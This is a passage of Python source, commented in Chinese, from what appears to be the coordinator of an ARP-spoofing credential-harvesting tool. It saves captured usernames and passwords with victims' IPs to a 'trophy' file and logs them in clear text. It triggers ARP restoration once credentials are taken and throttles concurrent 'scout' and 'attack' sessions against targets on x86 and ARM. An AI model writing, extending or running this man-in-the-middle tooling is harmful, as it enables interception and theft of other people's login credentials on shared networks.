            # ★【原子设置】★ 在所有检查通过后，原子性地标记为正在处理和已处理
            # 这确保了只有一个线程能进入处理逻辑
            self._processing_credentials.add(credential_key)
            self._processed_credentials.add(credential_key)
            
            # 在锁内执行实际保存操作，确保完全的原子性

            try:
                # 执行实际保存
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                log_entry = f"{source_ip},{username},{password},{timestamp}\n"
                
                trophy_file = "temporary.txt"
                with open(trophy_file, "a", encoding="utf-8") as f:
                    f.write(log_entry)
                
                # 标记为已保存
                self.state_cache.mark_credentials_saved(credential_key)
                
                self.logger.info(f"🏆 Credentials captured from {source_ip}: {username}:{password}")
                self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
                
                # ★【强化ARP恢复去重】★ 发送立即停止攻击命令
                self._trigger_immediate_withdrawal(source_ip)
                
            except Exception as e:
                self.logger.error(f"Failed to save credentials: {e}")
                # 发生错误时，从已处理集合中移除，允许重试
                self._processed_credentials.discard(credential_key)
            finally:
                # ★【重要】★ 无论成功失败都要从处理中集合移除
                self._processing_credentials.discard(credential_key)
    
    def _trigger_immediate_withdrawal(self, source_ip: str):
        """触发立即撤离 - 真正原子性的ARP恢复去重
        
        ★【关键修复】★ 确保每个IP只发送一次RESTORE_ARP命令，彻底消除消息风暴
        """
        # ★【原子性核心】★ 单一锁保护整个"检查-并-设置"操作
        with self._arp_restore_lock:
            # ★【原子检查】★ 检查是否已在恢复中
            if source_ip in self._restoring_targets:
                with self.stats_lock:
                    self.stats['arp_restore_deduplicated'] += 1
                self.logger.debug(f"🚫 ARP restore for {source_ip} already in progress, skipping")
                return
            
            # ★【原子设置】★ 在检查通过后，原子性地标记为正在恢复
            self._restoring_targets.add(source_ip)
            
            # 在锁内执行命令发送，确保完全的原子性
            try:
                stop_command = {
                    'type': 'RESTORE_ARP',  # ★【协议统一】★ 使用明确的RESTORE_ARP命令
                    'target_ip': source_ip,
                    'reason': 'credentials_captured'
                }
                
                if self.command_sender:
                    self.command_sender(stop_command)
                    self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
                    self.logger.info(f"🔧 Restoring ARP for {source_ip} (atomic operation)")
                    
                    with self.stats_lock:
                        self.stats['restores_initiated'] += 1
                    
                    # ★【优化】★ 延迟移除恢复标记，给C++足够时间处理
                    def remove_restore_flag():
                        time.sleep(3)  # 3秒后移除标记，确保C++端处理完成
                        with self._arp_restore_lock:
                            self._restoring_targets.discard(source_ip)
                            self.logger.debug(f"🧹 Removed restore flag for {source_ip}")
                    
                    # 启动清理定时器
                    cleanup_timer = threading.Timer(3.0, remove_restore_flag)
                    cleanup_timer.daemon = True
                    cleanup_timer.start()
                
                else:
                    self.logger.warning(f"❌ No command_sender available for {source_ip}")
                    # 如果没有command_sender，立即移除标记
                    self._restoring_targets.discard(source_ip)
                    
            except Exception as e:
                self.logger.error(f"Failed to trigger withdrawal for {source_ip}: {e}")
                # 发生错误时移除标记，允许重试
                self._restoring_targets.discard(source_ip)
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取协调器统计信息"""
        with self.stats_lock:
            stats = dict(self.stats)
        
        # 添加实时并发状态
        with self._global_credentials_lock:
            stats.update({
                'processing_credentials_count': len(self._processing_credentials),
                'processed_credentials_count': len(self._processed_credentials)
            })
        
        with self._arp_restore_lock:
            stats['restoring_targets_count'] = len(self._restoring_targets)
        
        with self._decision_lock:
            stats['processing_decisions_count'] = len(self._processing_decisions)
        
        # 添加会话状态
        session_stats = self.get_session_stats()
        stats.update(session_stats)
        
        # 添加状态缓存统计
        cache_stats = self.state_cache.get_statistics()
        stats.update({
            'cache_' + k: v for k, v in cache_stats.items()
        })
        
        return stats
    
    # ★【新增】★ 并发状态监控方法
    def get_concurrency_stats(self) -> dict:
        """获取并发处理状态统计"""
        stats = {}
        
        with self._global_credentials_lock:
            stats.update({
                'processing_credentials': len(self._processing_credentials),
                'processed_credentials': len(self._processed_credentials),
                'processing_items': list(self._processing_credentials) if len(self._processing_credentials) <= 5 else ['...too many to display...']
            })
        
        with self._arp_restore_lock:
            stats.update({
                'restoring_targets': len(self._restoring_targets),
                'restore_items': list(self._restoring_targets) if len(self._restoring_targets) <= 5 else ['...too many to display...']
            })
            
        return stats
    
    def log_concurrency_status(self):
        """记录并发状态到日志"""
        stats = self.get_concurrency_stats()
        self.logger.info(f"🔄 Concurrency Status - Processing Credentials: {stats['processing_credentials']}, Processed Credentials: {stats['processed_credentials']}, Restoring Targets: {stats['restoring_targets']}, Processing Decisions: {len(self._processing_decisions)}, Active Scouts: {len(self.active_scouts)}/{self.max_scout_attacks}, Active Attacks: {len(self.active_attacks)}/{self.max_active_attacks}")
        
        # 如果有正在处理的项目，输出详细信息（便于调试）
        if stats['processing_credentials'] > 0:
            self.logger.debug(f"🔄 Currently Processing Credentials: {stats['processing_items']}")
        if stats['restoring_targets'] > 0:
            self.logger.debug(f"🔄 Currently Restoring: {stats['restore_items']}")

    def _set_thread_priority_high(self):
        """跨平台设置线程高优先级"""
        try:
            import os
            if os.name == 'nt':  # Windows
                import ctypes
                ctypes.windll.kernel32.SetThreadPriority(
                    ctypes.windll.kernel32.GetCurrentThread(), 2)
                self.logger.debug("✅ Thread priority set to high (Windows)")
            else:  # Linux/Unix
                try:
                    import resource
                    os.nice(-5)  # 需要root权限
                    self.logger.debug("✅ Thread priority set to high (Linux)")
                except PermissionError:
                    self.logger.debug("⚠️ Need root permission to set thread priority (Linux)")
        except Exception as e:
            self.logger.debug(f"⚠️ Failed to set thread priority: {e}")
    
    def _load_concurrency_config(self):
        """从配置文件加载并发控制参数 - 强化版本"""
        # ARM平台检测
        is_arm = platform.machine().startswith(('arm', 'aarch'))
        
        # 从config.yaml读取或使用默认值
        concurrency_config = getattr(self.config, 'concurrency_control', {})
        
        if is_arm:
            # ARM平台保守配置
            self.scout_max = concurrency_config.get('scout_max_arm', 30)
            self.scout_launch_rate = concurrency_config.get('scout_launch_rate_arm', 4)
            self.attack_max = concurrency_config.get('attack_max_arm', 15)
            self.attack_refill_rate = concurrency_config.get('attack_refill_rate_arm', 2)
            # ★【强化去重】★ ARM平台使用更长的去重时间窗口
            self.event_dedup_ttl = concurrency_config.get('event_dedup_ttl_arm', 8)  # 从5秒延长到8秒
            self.command_dedup_ttl = concurrency_config.get('command_dedup_ttl_arm', 5)  # 从3秒延长到5秒
            self.logger.info(f"🔧 ARM platform detected - Scout: {self.scout_max}@{self.scout_launch_rate}/s, Attack: {self.attack_max}@{self.attack_refill_rate}/s, Dedup TTL: {self.event_dedup_ttl}s")
        else:
            # x86平台正常配置
            self.scout_max = concurrency_config.get('scout_max_x86', 50)
            self.scout_launch_rate = concurrency_config.get('scout_launch_rate_x86', 8)
            self.attack_max = concurrency_config.get('attack_max_x86', 25)
            self.attack_refill_rate = concurrency_config.get('attack_refill_rate_x86', 4)
            # ★【强化去重】★ x86平台使用更长的去重时间窗口
            self.event_dedup_ttl = concurrency_config.get('event_dedup_ttl_x86', 10)  # 从5秒延长到10秒
            self.command_dedup_ttl = concurrency_config.get('command_dedup_ttl_x86', 6)   # 从3秒延长到6秒
            self.logger.info(f"🖥️ x86 platform detected - Scout: {self.scout_max}@{self.scout_launch_rate}/s, Attack: {self.attack_max}@{self.attack_refill_rate}/s, Dedup TTL: {self.event_dedup_ttl}s")
        
        # ★【新增】★ 设置处理TTL为去重TTL，确保一致性
        self.processing_ttl = self.event_dedup_ttl
        
        self.logger.info(f"🛡️ IP deduplication window extended to {self.processing_ttl}s for enhanced protection")
    
    def get_deduplication_stats(self) -> dict:
        """获取去重机制统计信息"""
        stats = {}
        
        with self.processing_lock:
            stats.update({
                'active_processing_targets': len(self.processing_targets),
                'processing_ttl': self.processing_ttl,
                'oldest_processing_age': 0,
                'newest_processing_age': 0
            })
            
            # 计算处理目标的年龄分布
            if self.processing_targets:
                current_time = time.time()
                ages = [current_time - timestamp for timestamp in self.processing_targets.values()]
                stats['oldest_processing_age'] = max(ages)
                stats['newest_processing_age'] = min(ages)
                stats['avg_processing_age'] = sum(ages) / len(ages)
        
        with self.stats_lock:
            stats.update({
                'ip_dedup_blocks': self.stats.get('ip_dedup_blocks', 0),
                'targets_unprocessed': self.stats.get('targets_unprocessed', 0),
                'decisions_rate_limited': self.stats.get('decisions_rate_limited', 0),
                'decisions_fully_blocked': self.stats.get('decisions_fully_blocked', 0)
            })
        
        return stats
    
    def log_deduplication_status(self):
        """记录去重机制状态到日志"""
        stats = self.get_deduplication_stats()
        
        self.logger.info(
            f"🛡️ Dedup Status - Active: {stats['active_processing_targets']}, "
            f"IP Blocks: {stats['ip_dedup_blocks']}, "
            f"Rate Limited: {stats['decisions_rate_limited']}, "
            f"Fully Blocked: {stats['decisions_fully_blocked']}, "
            f"TTL: {stats['processing_ttl']}s"
        )
        
        # 如果有活跃的处理目标，显示年龄信息
        if stats['active_processing_targets'] > 0:
            self.logger.debug(
                f"🕐 Processing Ages - Oldest: {stats['oldest_processing_age']:.1f}s, "
                f"Newest: {stats['newest_processing_age']:.1f}s, "
                f"Avg: {stats.get('avg_processing_age', 0):.1f}s"
            )
    
    def _should_attack(self, target_ip: str, analysis_result) -> bool:
        """判断是否应该攻击目标 - 强化版本"""
        # 基本检查
        if not target_ip or target_ip == "0.0.0.0":
            return False
        
        # 检查是否在白名单
        if hasattr(self.config, 'whitelist') and target_ip in self.config.whitelist:
            self.logger.debug(f"🚫 Target {target_ip} is in whitelist, skipping")
            return False
        
        # 检查是否已经在攻击（Scout或Attack）
        with self.active_scouts_lock:
            if target_ip in self.active_scouts:
                self.logger.debug(f"🚫 Target {target_ip} already has active scout")
                return False
        
        with self.active_attacks_lock:
            if target_ip in self.active_attacks:
                self.logger.debug(f"🚫 Target {target_ip} already has active attack")
                return False
        
        # 检查状态缓存
        if hasattr(self.state_cache, 'should_attack_target'):
            if not self.state_cache.should_attack_target(target_ip):
                self.logger.debug(f"🚫 Target {target_ip} blocked by state cache")
                return False
        
        return True